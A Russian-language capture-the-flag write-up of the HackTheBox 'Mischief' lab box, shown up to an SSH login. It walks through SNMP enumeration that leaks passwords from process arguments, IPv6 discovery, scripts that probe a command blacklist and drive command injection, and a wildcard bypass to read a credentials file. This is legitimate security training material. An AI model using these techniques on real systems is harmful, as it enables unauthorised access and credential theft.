---
layout: post
title: "HTB{ Mischief }"
date: 2019-04-05 16:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Mischief, snmp, snmpwalk, snmp-check, onesixtyone, enyx.py, ipv6, iptables, ip6tables, eui-64, hydra, command-injection, reverse-shell, acl, getfacl, .bash_history, ping-pattern, icmp-shell, scapy, systemd-run, lxc]
comments: true
published: true
---

**Mischief** — моя любимая Linux-тачка на HTB на момент прохождения. Балансируя на уровне сложности где-то между "Medium" и "Hard" (хотя изначальный рейтинг был определен как "Insane"), эта виртуалка дает простор для творчества. Полагаю, если бы не некоторые ошибки автора (которые мы, конечно же, обсудим ниже), эта машина и правда была бы "безумной". Итак, с чем предстоит повоевать: энумерация *SNMP* с последующим извлечением авторизационных данных из аргументов командной строки для простого Python-сервера (пробуем разные тулзы, в том числе *snmpwalk*, *snmp-check*, *onesixtyone*, *enyx.py*), получение IPv6-адреса машины из того же вывода SNMP (1-й способ), либо через *pivoting* другого хоста на HTB из MAC-адреса последнего (2-й способ, алгоритм *EUI-64*), обход фильтра для возможности инъекции команд (+ создание мини *ICMP-шелла* с помощью *scapy* на сладкое) и захват кредов пользователя; наконец, получение *IPv6 реверс-шелла* в обход *iptables* для запуска *su* от имени www-data (так как пользователя блокирует механизм распределения прав доступа *ACL*) и получения root-сессии с кредами из *.bash_history*. *«— Не ходи туда, там тебя ждут неприятности. — Ну как же туда не ходить? Они же ждут!»*{:style="color:#a8a8a8;"} **Сложность: 6.3/10**{:style="color:red;"}

<!--cut-->

{: .center-image}
[![banner.png]({{ "/img/htb/boxes/mischief/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/145 "Hack The Box :: Mischief")

{: .center-image}
![info.png]({{ "/img/htb/boxes/mischief/info.png" | relative_url }})

* TOC
{:toc}

# Разведка
## Nmap
### TCP
Initial:
```text
root@kali:~# nmap -n -v -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.92
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Mon Apr  1 16:17:45 2019 as: nmap -n -v -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up (0.045s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3366/tcp open  creativepartnr

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Apr  1 16:18:11 2019 -- 1 IP address (1 host up) scanned in 26.45 seconds
```

Version ([красивый отчет]({{ "/nmap/htb/mischief/version.html" | relative_url }})):
```text
root@kali:~# nmap -n -v -Pn -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,3366 10.10.10.92
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Mon Apr  1 16:18:20 2019 as: nmap -n -v -Pn -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,3366 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 16:18:44 2019 -- 1 IP address (1 host up) scanned in 24.05 seconds
```

Не густо — есть SSH (22 TCP) и простой Python-HTTP-сервер с авторизацией (3366 TCP). С самого начала начинать брутить вслепую что бы то ни было — откровенный моветон, поэтому расширим поверхность атаки сканом UDP-портов.

### UDP
Initial:
```text
root@kali:~# nmap -n -v -Pn --min-rate 5000 -oA nmap/udp-initial -sU -p- 10.10.10.92
...
```

```text
root@kali:~# cat nmap/udp-initial.nmap
# Nmap 7.70 scan initiated Mon Apr  1 16:26:41 2019 as: nmap -n -v -Pn --min-rate 5000 -oA nmap/udp-initial -sU -p- 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up (0.048s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Apr  1 16:27:08 2019 -- 1 IP address (1 host up) scanned in 26.56 seconds
```

Version ([красивый отчет]({{ "/nmap/htb/mischief/udp-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -v -Pn -sV -sC -oA nmap/udp-version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -sU -p161 10.10.10.92
...
```

```text
root@kali:~# cat nmap/udp-version.nmap
# Nmap 7.70 scan initiated Mon Apr  1 16:27:39 2019 as: nmap -n -v -Pn -sV -sC -oA nmap/udp-version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -sU -p161 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up (0.043s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: b6a9f84e18fef95a00000000
|   snmpEngineBoots: 19
|_  snmpEngineTime: 16h02m33s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.10.10.92  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:7c:aa (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Status: up
|_    Traffic stats: 456.93 Kb sent, 39.49 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:3366         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:38577        *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes: 
| ...
Service Info: Host: Mischief

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 16:30:03 2019 -- 1 IP address (1 host up) scanned in 143.80 seconds
```

Уже интереснее — есть SNMP (161 UDP) и даже его вывод *by скриптовый движок Nmap'а* (опущен, т. к. он длинный и не очень информативный). От этого можно начинать танцевать.

## Энумерация SNMP — Порт 161 UDP
Как сообщает Вики:
> SNMP (англ. Simple Network Management Protocol — простой протокол сетевого управления) — стандартный интернет-протокол для управления устройствами в IP-сетях на основе архитектур TCP/UDP. К поддерживающим SNMP устройствам относятся маршрутизаторы, коммутаторы, серверы, рабочие станции, принтеры, модемные стойки и другие. Протокол обычно используется в системах сетевого управления для контроля подключённых к сети устройств на предмет условий, которые требуют внимания администратора.
>
> SNMP возглавляет составленный SANS Institute список «Common Default Configuration Issues» с вопросом изначальной установки строк сообщества на значения «public» и «private» и занимал десятую позицию в SANS Top 10 Самых критических угроз Интернет-безопасности за 2000 год.

Простыми словами, SNMP позволяет собирать и расшаривать информацию о том, что происходит на хостах в сети. Информация такого рода инкапсулируется в *базу управляющей информации* MIB (aka ***M**anagement **I**nformation **B**ase*), а *идентификаторы объектов* OID (aka ***O**bject **Id**entifiers*) однозначно определяют записи в этой базе. К примеру, идентификатор `1.3.6.1.2.1.4.34` описывает сущность `ipAddressTable` (таблица IP-адресов), а `1.3.6.1.2.1.4.34.1.3` описывает сущность `ipAddressIfIndex` (индекс интерфейса).

Рассмотрим некоторые инструменты для сбора информации из сервиса SNMP, доступные в Kali Linux.

### snmpwalk
Дефолтная утилита для SNMP-разведки.

#### Настройка
Если запустить snmpwalk при дефолтных настройках, ничего кроме непонятных для человеческого взгяда идентификаторов OID мы не получим. Здесь на помощь приходит пакет `snmp-mibs-downloader`, загружающий и инсталлирующий базу MIB.

Установим его:
```text
root@kali:~# apt install snmp-mibs-downloader -y
...
```

И применим настройки, закомментировав единственную значащую строку в `/etc/snmp/snmp.conf`.

#### Дамп
С помощью snmpwalk сдампим весь SNMP с указанием версии протокола `2c` (самая распространенная) и строки сообщества `public`:
```text
root@kali:~# snmpwalk -v 2c -c public 10.10.10.92 | tee snmpwalk.out
...
```

Вывод массивный, поэтому он был перенаправлен в файл для дальнейшей работы.

К слову: если бы нам нужно было оставаться более бесшумными, было бы рационально запросить у snmpwalk только ту информацию, *которая нам нужна*. Например, чтобы  получить список запущенных процессов, достаточно уточнить запрос опцией `hrSWRunName` (OID `1.3.6.1.2.1.25.4.2.1.2`):
```text
root@kali:~# snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: "systemd"
HOST-RESOURCES-MIB::hrSWRunName.2 = STRING: "kthreadd"
HOST-RESOURCES-MIB::hrSWRunName.4 = STRING: "kworker/0:0H"
HOST-RESOURCES-MIB::hrSWRunName.6 = STRING: "mm_percpu_wq"
HOST-RESOURCES-MIB::hrSWRunName.7 = STRING: "ksoftirqd/0"
HOST-RESOURCES-MIB::hrSWRunName.8 = STRING: "rcu_sched"
HOST-RESOURCES-MIB::hrSWRunName.9 = STRING: "rcu_bh"
HOST-RESOURCES-MIB::hrSWRunName.10 = STRING: "migration/0"
HOST-RESOURCES-MIB::hrSWRunName.11 = STRING: "watchdog/0"
HOST-RESOURCES-MIB::hrSWRunName.12 = STRING: "cpuhp/0"
HOST-RESOURCES-MIB::hrSWRunName.13 = STRING: "kdevtmpfs"
HOST-RESOURCES-MIB::hrSWRunName.14 = STRING: "netns"
HOST-RESOURCES-MIB::hrSWRunName.15 = STRING: "rcu_tasks_kthre"
HOST-RESOURCES-MIB::hrSWRunName.16 = STRING: "kauditd"
HOST-RESOURCES-MIB::hrSWRunName.17 = STRING: "khungtaskd"
HOST-RESOURCES-MIB::hrSWRunName.18 = STRING: "oom_reaper"
HOST-RESOURCES-MIB::hrSWRunName.19 = STRING: "writeback"
HOST-RESOURCES-MIB::hrSWRunName.20 = STRING: "kcompactd0"
HOST-RESOURCES-MIB::hrSWRunName.21 = STRING: "ksmd"
HOST-RESOURCES-MIB::hrSWRunName.22 = STRING: "khugepaged"
...
```

#### Список запущенных процессов
Вспомним, что мы видели простой Python-HTTP-сервер на 3366-м TCP порту, запрашивающий авторизацию. Креды от такого сервака подаются питону в качестве аргументов командной строки в виде `SimpleHTTPAuthServer [-h] [--dir DIR] [--https] port key`, поэтому мы можем попробывать отыскать их в нашем дампе.

Для этого среди записей типа `hrSWRunName` найдем процесс Python'а:
```text
root@kali:~# cat snmpwalk.out | grep hrSWRunName | grep python
HOST-RESOURCES-MIB::hrSWRunName.593 = STRING: "python"
```

И далее по полученному индексу `593` выведем все, что относится к этому процессу в табличке `hrSWRunTable`:
```text
root@kali:~# cat snmpwalk.out | grep 593
HOST-RESOURCES-MIB::hrSWRunIndex.593 = INTEGER: 593
HOST-RESOURCES-MIB::hrSWRunName.593 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.593 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.593 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.593 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
HOST-RESOURCES-MIB::hrSWRunType.593 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.593 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.593 = INTEGER: 1129
HOST-RESOURCES-MIB::hrSWRunPerfMem.593 = INTEGER: 13852 KBytes
HOST-RESOURCES-MIB::hrSWInstalledIndex.593 = INTEGER: 593
HOST-RESOURCES-MIB::hrSWInstalledName.593 = STRING: "tzdata-2018d-1"
HOST-RESOURCES-MIB::hrSWInstalledID.593 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWInstalledType.593 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWInstalledDate.593 = STRING: 0-1-1,0:0:0.0
```

Запись `hrSWRunParameters` дает нам параметры запуска сервера `-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/`, где находятся необходимые нам авторизационные данные `loki:godofmischiefisloki`.

#### IPv6-адрес
Просматривая список процессов, я увидел запущенный `apache2`:
```text
root@kali:~# cat snmpwalk.out| grep hrSWRunName | grep apache
HOST-RESOURCES-MIB::hrSWRunName.770 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.2549 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.2550 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.2551 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.2552 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.2553 = STRING: "apache2"
```

При этом Nmap его не показал... Это может означать, что сервер крутится в мире IPv6, и было бы неплохо вытащить соответствующий IP-адрес для того, чтобы позже инициировать Nmap-сканирование повторно (но на этот раз для IPv6-адреса):
```text
root@kali:~# cat snmpwalk.out| grep ipAddressType | grep ipv6
IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:7c:aa" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:7c:aa" = INTEGER: unicast(1)
```

```text
root@kali:~# ping6 -c2 dead:beef::0250:56ff:feb9:7caa
PING dead:beef::0250:56ff:feb9:7caa(dead:beef::250:56ff:feb9:7caa) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:7caa: icmp_seq=1 ttl=63 time=43.5 ms
64 bytes from dead:beef::250:56ff:feb9:7caa: icmp_seq=2 ttl=63 time=42.9 ms

--- dead:beef::0250:56ff:feb9:7caa ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 4ms
rtt min/avg/max/mdev = 42.922/43.214/43.507/0.358 ms
```

Видим маршрутизируемый IPv6-адрес `de:ad:be:ef::02:50:56:ff:fe:b9:7c:aa` и link-local IPv6-адрес `fe:80::02:50:56:ff:fe:b9:7c:aa` (которые, к слову, будут меняться при каждом ресете коробки). О втором способе получения link-local адреса на основе идентификатора EUI-64 говорим [здесь]({{ page.url }}#ipv6-адрес-с-помошью-eui-64).

### snmp-check
Тоже стандартная Kali'вская тулза, которая из коробки дает читабельный результат (но не самый подробный). Юзать так:
```text
root@kali:~# snmp-check -v 2c -c public 10.10.10.92 | tee snmp-check.out
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.92:161 using SNMPv2c and community 'public'
...

[*] Processes:

  Id                    Status                Name                  Path                  Parameters
...
593                   runnable              python                python                -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
...
```

### onesixtyone
Также в Кали есть утилита для брутфорса строк сообщества (пригодилось бы нам, если бы дефолтная "public" нам не подошла).

Хотя onesixtyone входит в состав дистрибутива, скачаем [последнюю версию](https://github.com/trailofbits/onesixtyone "trailofbits/onesixtyone: Fast SNMP Scanner"), скомпилируем и запустим со [словарем от SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt "SecLists/common-snmp-community-strings.txt at master · danielmiessler/SecLists"):
```text
root@kali:~# cd /opt
root@kali:/opt# git clone https://github.com/trailofbits/onesixtyone && cd onesixtyone
root@kali:/opt/onesixtyone# gcc -o onesixtyone onesixtyone.c
```

```text
root@kali:/opt/onesixtyone# ./onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92
Scanning 1 hosts, 122 communities
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 07:20:15 UTC 2018 x86_64
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 07:20:15 UTC 2018 x86_64
```

### enyx.py
У [trickster0](https://www.hackthebox.eu/home/users/profile/169 "Hack The Box :: trickster0"), создателя машины, есть [утилита](https://github.com/trickster0/Enyx "trickster0/Enyx: Enyx SNMP IPv6 Enumeration Tool"), позволяющая по SNMP узнать IPv6-адрес хоста в один клик, что тоже является своего рода подсказкой, по моему мнению.

Для использования скрипта настройки `/etc/snmp/snmp.conf` должны быть выставлены по умолчанию (т. е. единственная значащая строка должна быть снова раскомментирована):
```text
root@kali:~# cd /opt
root@kali:/opt# git clone https://github.com/trickster0/Enyx && cd Enyx
```

```text
root@kali:/opt/Enyx# python enyx.py 2c public 10.10.10.92
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:7caa
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:7caa
```

# Web — Порт 3366 TCP
## Браузер
Вернемся к нашим ~~баранам~~ открытым портам и отправимся смотреть на простой Python-HTTP-сервер:

[![port3366-browser-1.png]({{ "/img/htb/boxes/mischief/port3366-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port3366-browser-1.png" | relative_url }})

Мы уже выбили креды `loki:godofmischiefisloki`, поэтому без зазрения совести авторизируемся и попадаем сюда:

[![port3366-browser-2.png]({{ "/img/htb/boxes/mischief/port3366-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port3366-browser-2.png" | relative_url }})

Имеем изображение Локи (на стеганографию проверять здесь не буду, поэтому поверьте на слово — там ничего нет :unamused:) и еще одну пару логин:пароль `loki:trickeryanddeceit`.

# Nmap IPv6
Не забываем об [обнаруженном apache]({{ page.url }}#ipv6-адрес) и обещании еще раз пробежать Nmap на IPv6-диапазон.

Initial:
```text
root@kali:~# nmap -6 -n -v -Pn --min-rate 5000 -oA nmap/ipv6-initial -p- dead:beef::0250:56ff:feb9:7caa
...
```

```text
root@kali:~# cat nmap/ipv6-initial.nmap
# Nmap 7.70 scan initiated Tue Apr  2 23:57:10 2019 as: nmap -6 -n -v -Pn --min-rate 5000 -oA nmap/ipv6-initial -p- dead:beef::0250:56ff:feb9:7caa
Nmap scan report for dead:beef::250:56ff:feb9:7caa
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Apr  2 23:57:23 2019 -- 1 IP address (1 host up) scanned in 13.65 seconds
```

Version ([красивый отчет]({{ "/nmap/htb/mischief/udp-version.html" | relative_url }})):
```text
root@kali:~# nmap -6 -n -v -Pn -sV -sC -oA nmap/ipv6-version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,80 dead:beef::0250:56ff:feb9:7caa
...
```

```text
root@kali:~# cat nmap/ipv6-version.nmap
# Nmap 7.70 scan initiated Tue Apr  2 23:58:05 2019 as: nmap -6 -n -v -Pn -sV -sC -oA nmap/ipv6-version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,80 dead:beef::0250:56ff:feb9:7caa
Nmap scan report for dead:beef::250:56ff:feb9:7caa
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:b9:7c:aa
|_      manuf: VMware

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  2 23:58:15 2019 -- 1 IP address (1 host up) scanned in 9.41 seconds
```

Есть СекуреШелл (22) и тот самый Апаче веб-сервер (80). Туда мы и отправимся.

# Web — Порт 80 (IPv6)
## Браузер
На `http://[dead:beef::250:56ff:feb9:7caa]:80/` нас поджидает очередное предложение залогиниться:

[![port80-ipv6-browser-1.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-1.png" | relative_url }})

[![port80-ipv6-browser-2.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-2.png" | relative_url }})

Это таск из серии "Угадай юзернейм". [В конце райтапа]({{ page.url }}#hydra) сбрутим эту форму Гидрой (хотя даже этого можно не делать, ибо [авторизация байпасится]({{ page.url }}#rce-без-авторизации)), а пока сделаем вид, что креды мы угадали (хотя со мной именно так изначально и было), благо имя пользователя дефолтное — `administrator:trickeryanddeceit`.

## Command Execution Panel
После авторизации получаем окошко с RCE, где нам сразу же предлагают пингануть localhost:

[![port80-ipv6-browser-3.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-3.png" | relative_url }})

Что ж, если предлагают, то почему нет? Только вот 127.0.0.1 я, пожалуй, заменю на айпишник своей машины, чтобы убедиться в успешности выполнения команды:

[![port80-ipv6-browser-4.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-4.png" | relative_url }})

```text
root@kali:~# tcpdump -n -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
01:08:50.065483 IP 10.10.10.92 > 10.10.14.11: ICMP echo request, id 1490, seq 1, length 64
01:08:50.065501 IP 10.10.14.11 > 10.10.10.92: ICMP echo reply, id 1490, seq 1, length 64
01:08:51.050468 IP 10.10.10.92 > 10.10.14.11: ICMP echo request, id 1490, seq 2, length 64
01:08:51.050485 IP 10.10.14.11 > 10.10.10.92: ICMP echo reply, id 1490, seq 2, length 64
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```

Есть контакт, экспериментируем дальше.

### Фильтрация команд
Если захочешь внаглую вызвать `nc` для инициализации реверс-подключения, ты разочаруешься:

[![port80-ipv6-browser-5.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-5.png" | relative_url }})

Скорее всего, на машине активен WAF-like механизм, блокирующий выполнение команд, которые содержат слова из черного списка. Разминки ради можно, вооружившись Burp'ом и вытащив кукисы сайта, проверить, какие команды разрешены, а какие нет.

Для этого будем использовать curl следующим образом:
```html
root@kali:~# curl -6 -s -X POST 'http://[dead:beef::250:56ff:feb9:7caa]:80/' -H 'Cookie: PHPSESSID=bppkfmhuiv9kngkmvir3s44vtj' -d 'command=nc'

<!DOCTYPE html>
<html>
<title>Command Execution Panel (Beta)</title>
<head>
        <link rel="stylesheet" type="text/css" href="assets/css/style.css">
        <link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
</head>
<body>

        <div class="header">
                <a href="/">Command Execution Panel</a>
        </div>


                <br />Welcome administrator
                <br /><br />
                <a href="logout.php">Logout?</a>
                <form action="/" method="post">
                Command: <br>
                <input type="text" name="command" value="ping -c 2 127.0.0.1"><br>
                <input type="submit" value="Execute">
                </form>
                <p>
                <p>
                <p>In my home directory, i have my password in a file called credentials, Mr Admin
                <p>

</body>
</html>
Command is not allowed.
```

И для автоматизации процесса набросаем небольшой скрипт, который будет принимать словарь, содержащий список команд для проверки (команды возьмем [отсюда](https://ss64.com/bash/ "An A-Z Index of the Linux command line / SS64.com"), к примеру, чтобы не придумывать самому):
```bash
#!/usr/bin/env bash

# Usage: ./test_waf_blacklist <IP_STR> <COOKIE_STR> <DICT_FILE>

IP=$1
COOKIE=$2
DICT=$3

G="\033[1;32m" # GREEN
R="\033[1;31m" # RED
NC="\033[0m"   # NO COLOR

for cmd in $(cat ${DICT}); do
	curl -6 -s -X POST "http://[${IP}]:80/" -H "Cookie: ${COOKIE}" -d "command=${cmd}" | grep -q "Command is not allowed."
	if [ $? -eq 1 ]; then
		echo -e "${G}${cmd}${NC} allowed"
	else
		echo -e "${R}${cmd}${NC} blocked"
	fi
done
```

В качестве результата имеем:

[![test-waf-blacklist-1.png]({{ "/img/htb/boxes/mischief/test-waf-blacklist-1.png" | relative_url }})]({{ "/img/htb/boxes/mischief/test-waf-blacklist-1.png" | relative_url }})

[Здесь]({{ page.url }}#waf) мы обсуждаем, как именно устроен процесс фильтрации.

# Угон аккаунта Локи
## Смотрим результат выполнения команд
Размышляя о том, как осуществляется анализ результата выполнения запрошенной команды в Command Execution Panel, я предположил самое очевидное: вывод редиректится в /dev/null, а успех выполнения оценивается по коду возврата. Только вот пайпы и редиректы в этих ваших башах штука замороченная, и за мисконфиг можно дорого поплатиться. Например, если неправильно организовать перенаправление при сцеплении двух команд с помощью `;`, то в /dev/null отправится только результат выполнения последней команды в цепочке, а все, что было *до*, благополучно уйдет в stdout.

Поэтому я не сильно удивился, когда увидел результат выполнения двух stacked-команд `whoami; echo`:

[![port80-ipv6-browser-6.png]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-6.png" | relative_url }})]({{ "/img/htb/boxes/mischief/port80-ipv6-browser-6.png" | relative_url }})

То есть мы преспокойно можем видеть вывод выполненной команды. И хотя это совсем не тот путь, [который задумывался автором машины]({{ page.url }}#icmp-shell), в первом способе угона аккаунта Локи мы будем абьюзить именно эту ошибку конфигурации.

### 1-й способ: /home/loki/credentials
На веб-морде панели выполнения команд есть подсказка о местоположении авторизационных данных пользователя. Но... нельзя так просто взять и написать `cat /home/loki/credentials;`, чтобы получить креды Локи, ведь слово `credentials` в блэклисте:

[![test-waf-blacklist-2.png]({{ "/img/htb/boxes/mischief/test-waf-blacklist-2.png" | relative_url }})]({{ "/img/htb/boxes/mischief/test-waf-blacklist-2.png" | relative_url }})

Зато, как видно из этого же скриншота, мы можем обратиться к `credentials` через `credential?` или `cred*`.

Окей, но сначала напишем скрипт, чтобы сделать это не выходя из терминала:
```bash
#!/usr/bin/env bash

# Usage: ./command_execution_panel.sh <IP_STR> <COOKIE_STR>

IP=$1
COOKIE=$2

while :
do
	read -p "mischief> "  CMD
	curl -6 -s -X POST "http://[${IP}]:80/" -H "Cookie: ${COOKIE}" -d "command=${CMD};" | grep -F "</html>" -A 10 | grep -vF -e "</html>" -e "Command was executed succesfully!"
	echo
done
```

```text
root@kali:~# ./command_execution_panel.sh 'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=a7kss4kl91ts09dq153lekjmjf'
mischief> whoami
www-data

mischief> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

mischief> uname -a
Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```text
root@kali:~# ./command_execution_panel.sh 'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=a7kss4kl91ts09dq153lekjmjf'
mischief> cat /home/loki/cred*
pass: lokiisthebestnorsegod
```

И у нас есть данные для вторжения по SSH `loki:lokiisthebestnorsegod`:
```text
root@kali:~# sshpass -p 'lokiisthebestnorsegod' ssh loki@10.10.10.92
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


